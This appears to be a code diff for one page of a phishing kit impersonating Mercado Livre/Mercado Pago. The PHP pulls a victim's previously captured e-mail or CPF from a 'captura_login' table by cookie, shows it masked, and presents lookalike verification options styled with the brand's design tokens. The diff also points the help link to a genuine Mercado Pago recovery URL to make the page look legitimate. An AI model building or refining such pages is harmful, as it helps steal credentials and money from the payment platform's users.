@@ -1,35 +1,20 @@
 <?php
-// Inicia a sessão
+// Bloco PHP completo para buscar e formatar dados
 session_start();
-
-// Inclui a conexão com o banco de dados
 require 'db.php';
-
-// Prepara variáveis com valores padrão
 $identificador_label = 'Não identificado';
 $email_mascarado = 'seu e-mail';
-$telefone_final_mascarado = '****';
-
-// 1. Verifica se o cookie 'identificador_cliente' existe
+$telefone_final = '****';
 if (isset($_COOKIE['identificador_cliente'])) {
     $session_id = $_COOKIE['identificador_cliente'];
-
     try {
-        // 2. Busca o identificador mais recente para esta sessão
-        $stmt = $pdo->prepare(
-            "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
-        );
+        $stmt = $pdo->prepare("SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
         $stmt->execute([$session_id]);
         $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
-
         if ($resultado) {
             $identificador_puro = $resultado['identificador'];
-            
-            // Formata o label e define o tipo
             if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
                 $identificador_label = 'E-mail: ' . htmlspecialchars($identificador_puro);
-                
-                // Lógica para mascarar E-MAIL no formato 'niv***@gmail.com'
                 $partes_email = explode('@', $identificador_puro);
                 if (count($partes_email) === 2) {
                     $usuario = $partes_email[0];
@@ -37,21 +22,12 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     $usuario_visivel = substr($usuario, 0, 3);
                     $email_mascarado = htmlspecialchars($usuario_visivel) . '***@' . htmlspecialchars($dominio);
                 }
-
             } else {
                 $identificador_label = 'CPF: ' . htmlspecialchars($identificador_puro);
             }
-        } else {
-            header('Location: login-mobile.php');
-            exit;
-        }
-    } catch (PDOException $e) {
-        die("Erro ao consultar o banco de dados: " . $e->getMessage());
-    }
-} else {
-    header('Location: login-mobile.php');
-    exit;
-}
+        } else { header('Location: login-mobile.php'); exit; }
+    } catch (PDOException $e) { die("Erro ao consultar o banco de dados: " . $e->getMessage()); }
+} else { header('Location: login-mobile.php'); exit; }
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -74,6 +50,8 @@ if (isset($_COOKIE['identificador_cliente'])) {
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
         .main-header { background-color: var(--andes-color-yellow-500); padding: 12px 24px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; box-sizing: border-box; display: flex; align-items: center; }
         .main-header img { height: 32px; }
+        
+        /* ALTERAÇÃO: Main content agora é um container flex para empurrar o rodapé de ajuda para baixo */
         .main-content { padding: 24px; background-color: var(--andes-background-color-primary); flex-grow: 1; display: flex; flex-direction: column; }
         
         .user-identifier-box { display: flex; align-items: center; gap: 12px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; width: fit-content; margin-bottom: 24px; }
@@ -89,18 +67,33 @@ if (isset($_COOKIE['identificador_cliente'])) {
         .verification-card { box-sizing: border-box; }
         .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 0; text-decoration: none; color: inherit; }
         .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-        .verification-option .icon-container svg { color: var(--andes-color-blue-500); }
         .verification-option .icon-container svg path { fill: currentColor; }
-        .verification-option .icon-container svg .channel-icon__shape--stroked { stroke: currentColor; stroke-width: 1.5; fill: none; }
         .verification-option .text-content { flex-grow: 1; }
         .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; }
         .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
         .verification-option .chevron-icon { margin-left: auto; }
         .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
         
-        .final-separator { height: 1px; background-color: var(--andes-border-color-secondary); margin: 16px 0; }
-        .cant-login-link { display: block; text-align: center; color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; padding: 16px 0; }
-        .help-link { display: block; margin-top: auto; padding-top: 32px; text-align: center; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
+        /* NOVO: Wrapper para os links inferiores */
+        .bottom-support {
+            margin-top: auto; /* Empurra para o final do container */
+            padding-top: 24px;
+            text-align: center;
+        }
+
+        .final-separator {
+            height: 1px;
+            background-color: var(--andes-border-color-secondary);
+            width: 100%;
+            margin: 0 auto 16px auto; /* Espaço abaixo do separador */
+        }
+        
+        .help-link {
+            color: var(--andes-text-color-link);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
@@ -157,7 +150,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
                 <div class="final-separator"></div>
                 
-                <a href="#" class="cant-login-link">Não consigo iniciar sessão</a>
+                <a href="https://www.mercadopago.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAy1P2w6CMAz9lz0bwHvg0R9ZCpTZuLFlKw5j_Hc79PGcnlvfynpDs-ZXQNUpXIOlgVjtVLDAk49O0ygHF4RKxPiHti8SiOCQMSbVvUuQwfGGYipRHBcUDSx815P1WaitSjhKGlexzWB1xv5JWK4T2FQcxgu4M4fU1XXOuXIYBxh9AOOrwbuqj7XIIhpKEoJl3lb22UlGYs0RhofqCif9oXwETH7-Tb-c2vNhf2zatjldzlf1-QLy-mEhAwEAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.26fffe04d42d6e334d245750e2be1f8563da232381384b96c08a7c0f0c67185eb2c7c4a614f5f3279aeea54552a2f88c5819aa3720ab720a18c5e3fe6690abbec651fb16a6a8816317b21d773163d163fcd3ded440ef946cd7c9957f4e3fcc32.fbb6183e18d9eba0900a8ec20ff7d912%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=aPsEtzPIkxgHrqeP2RIaFCOA5k7VZLGN" class="cant-login-link">Não consigo iniciar sessão</a>
             </div>
         </div>
     </main>
